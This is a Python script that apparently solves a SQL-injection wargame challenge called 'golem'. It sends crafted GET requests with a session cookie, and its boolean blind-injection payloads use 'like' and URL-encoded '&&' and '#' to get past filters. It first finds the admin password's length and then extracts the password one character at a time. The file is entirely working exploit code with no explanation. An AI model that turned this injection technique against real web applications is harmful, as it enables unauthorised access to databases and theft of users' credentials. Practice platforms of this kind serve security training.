import requests
import string

url = "https://los.rubiya.kr/chall/golem_4b5202cfedd8160e73124b5234235ef5.php?"
cookie = {'PHPSESSID':'bcd0e9jn92c6o9o15182l85se8'}

def pw_length():
    pw_len = 0
    while True:
        pw_len += 1
        query = "pw='||id like 'admin'%26%26length(pw) like {}%23".format(pw_len)
        res = requests.get(url=url+query, cookies=cookie)
        print("try " + query)
        if "Hello admin" in res.text:
            print("PASSWORD LENGTH : " + str(pw_len))
            break
    return pw_len

def pw_char(pw_len):
    passwd = ""
    for i in range(1, pw_len+1):
        for j in string.printable:
            query = "pw='||id like 'admin'%26%26mid(pw,{},1) like '{}'%23".format(i,j)
            res = requests.get(url=url+query, cookies=cookie)
            print("try " + query)
            if "Hello admin" in res.text:
                passwd += j
                print("PASSWORD CHAR FOUND : " + j)
                break
    print("PASSWORD : " + passwd)

if __name__ == "__main__":
    pw_len = pw_length()
    pw_char(pw_len)
